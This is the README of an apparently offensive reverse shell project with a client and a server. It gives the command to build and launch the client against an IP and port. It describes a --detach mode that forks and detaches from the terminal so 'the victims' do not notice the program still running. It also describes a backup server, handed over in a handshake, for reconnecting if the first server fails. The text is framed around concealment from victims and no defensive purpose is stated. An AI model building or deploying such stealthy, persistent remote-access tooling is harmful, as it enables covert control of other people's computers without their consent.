# Reverse Shell
this projects contains a client side and a server side
## client side:
```
make && ./client -i ip -p port --detach 
```
if you use --detach it makes a child process and kills the parent and  detachs the child from terminal so the victims does not realize that the program is still running 
and reroute stdout to a file for debug purposes
client gets a back up port and ip and makes a child process so if we confronted any problems with connecting to the current server the it signals the already made child process to proceed and connect
to the back up server with the given back up port and ip given from the server in the handshake


